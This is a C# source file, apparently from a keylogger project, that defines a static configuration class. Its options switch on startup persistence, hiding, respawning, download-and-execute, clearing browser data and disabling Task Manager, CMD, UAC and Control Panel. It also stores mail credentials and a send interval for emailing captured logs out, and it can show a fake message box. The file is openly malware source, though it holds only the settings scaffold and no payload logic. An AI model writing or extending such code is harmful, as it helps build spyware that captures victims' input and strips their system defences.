namespace UnknownLibrary.Keylogger.Variables
{
    public static class Variables
    {


        public static bool AddToStartup, Hide, Respawner, DownloadAndExecute, SiteVisitor,
            SilentSiteVisitor, ClearChromeAndFireFoxData, DisableTaskManager, DisableCMD, DisableUAC,
            DisableControlPanel, LogScreenshot, FakeMessageBox;

        public static string MessageBoxName, MessageBoxText, MessageBoxOption, MessageBoxIcon, MailTo, MailFrom, MailPassword;
        public static int SendInterval;

       public static void Initialize(bool AddToStartupbool, bool Hidebool, bool Respawnerbool, bool DownloadAndExecutebool, bool SiteVisitorbool,
            bool SilentSiteVisitorbool, bool ClearChromeAndFireFoxDatabool, bool DisableTaskManagerbool, bool DisableCMDbool, bool DisableUACbool,
            bool DisableControlPanelbool, bool LogScreenshotbool, bool FakeMessageBoxbool,
            string MessageBoxNamestring, string MessageBoxTextstring, string MessageBoxOptionstring, string MessageBoxIconstring, string MailTostring, string MailFromstring,
            string MailPasswordstring, int SendIntervalint)
        {
            AddToStartup = AddToStartupbool; Hide = Hidebool; Respawner = Respawnerbool; DownloadAndExecute = DownloadAndExecutebool; SiteVisitor = SiteVisitorbool;
            SilentSiteVisitor = SilentSiteVisitorbool; ClearChromeAndFireFoxData = ClearChromeAndFireFoxDatabool; DisableTaskManager = DisableTaskManagerbool; DisableCMD = DisableCMDbool; DisableUAC = DisableUACbool;
            DisableControlPanel = DisableControlPanelbool; FakeMessageBox = FakeMessageBoxbool;
            MessageBoxName = MessageBoxNamestring; MessageBoxText = MessageBoxTextstring; MessageBoxOption = MessageBoxOptionstring; MessageBoxIcon = MessageBoxIconstring; MailTo = MailTostring; MailFrom = MailFromstring;
            MailPassword = MailPasswordstring; SendInterval = SendIntervalint;
        }
    }
}
